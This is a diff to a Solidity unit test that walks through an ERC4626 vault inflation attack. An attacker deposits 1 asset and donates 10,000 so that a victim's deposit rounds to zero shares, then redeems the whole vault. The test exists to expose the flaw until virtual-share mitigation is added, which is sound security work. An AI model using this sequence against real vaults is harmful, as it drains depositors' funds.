@@ -424,34 +424,68 @@ contract ERC4626UnitTest is BaseContract {
     ///////////////////////////// INFLATION ATTACK /////////////////////////////
 
     /**
-     * @notice Demonstrates the ERC4626 inflation attack.
-     * @dev An attacker deposits a small amount of assets and then directly
-     *      donates assets to the vault. This increases the asset/share ratio
-     *      without increasing the attacker's share balance.
+     * @notice Demonstrates the ERC4626 inflation attack caused by direct donations.
+     * @dev The attacker first deposits a minimal amount of assets to obtain shares,
+     *      then directly donates additional assets to the vault without receiving
+     *      any additional shares. This artificially increases the vault's
+     *      assets-per-share exchange rate.
      *
-     *      A subsequent depositor receives significantly fewer shares because
-     *      the conversion rounds down against the depositor.
+     *      When a subsequent depositor deposits assets, the inflated exchange rate
+     *      causes the number of shares calculated for the depositor to round down.
+     *      In the vulnerable implementation, the depositor may receive zero shares
+     *      while their assets remain in the vault, allowing the attacker to
+     *      redeem the vault's assets through their existing shares.
      *
-     *      This test intentionally demonstrates the vulnerable behavior and
-     *      should fail or be replaced after an inflation-attack mitigation
-     *      such as virtual assets/shares is implemented.
+     *      This test intentionally demonstrates the vulnerable behavior and is
+     *      expected to be updated when an inflation-attack mitigation, such as
+     *      virtual assets and shares, is implemented.
      */
     function test_inflationAttack_DonationDilutesNextDepositor() external {
-        _deposit(hacker, 10);
+        // Attacker makes the initial deposit and receives 1 share.
+        // At this point, the vault has 1 asset and 1 share:
+        // 1 asset = 1 share.
+        _deposit(hacker, 1);
 
-        // Initially: 1 share = 1 USDT.
-        assertEq(tokenVault.balanceOf(hacker), 10);
+        // The initial exchange rate is 1 asset per share.
+        assertEq(tokenVault.balanceOf(hacker), 1);
 
+        // The attacker directly donates 10,000 assets to the vault.
+        // The donation increases totalAssets() but does not mint any shares.
+        // This artificially increases the asset/share exchange rate.
         vm.prank(hacker);
-        usdt.transfer(address(tokenVault), 500);
+        usdt.transfer(address(tokenVault), 10000);
 
-        // Donation increases the asset/share ratio but does not mint shares.
-        // Vault state: 510 assets / 10 shares = 51 assets per share.
-        assertEq(tokenVault.balanceOf(hacker), 10);
+        // The attacker still owns only 1 share because donations
+        // do not result in additional share issuance.
+        assertEq(tokenVault.balanceOf(hacker), 1);
 
+        // The victim deposits 1,000 assets.
+        // Because the vault's asset/share ratio has been heavily inflated
+        // by the attacker's donation, the calculated shares are rounded down.
         _deposit(user1, 1000);
 
-        // Due to rounding down, the victim receives only 19 shares.
-        assertEq(tokenVault.balanceOf(user1), 19);
+        // The victim receives 0 shares due to integer division rounding.
+        // The deposited assets nevertheless remain inside the vault.
+        assertEq(tokenVault.balanceOf(user1), 0);
+
+        // The vault now contains the attacker's initial 1 asset,
+        // the 10,000 asset donation, and the victim's 1,000 asset deposit.
+        assertEq(tokenVault.totalAssets(), 11001);
+
+        // The attacker owns the only outstanding share and can therefore
+        // redeem the entire vault balance, including the victim's deposit.
+        uint256 shares = tokenVault.balanceOf(hacker);
+
+        vm.prank(hacker);
+        tokenVault.redeem(shares, hacker, hacker);
+
+        // After redeeming the attacker's only share, all assets have been
+        // withdrawn from the vault. The victim received no shares and
+        // therefore has no claim on the deposited assets.
+        assertEq(tokenVault.totalAssets(), 0);
+
+        // The attacker ends up with the entire vault balance:
+        // initial deposit + donation + victim's deposit = 11,001 USDT.
+        assertEq(usdt.balanceOf(hacker), 11001);
     }
 }
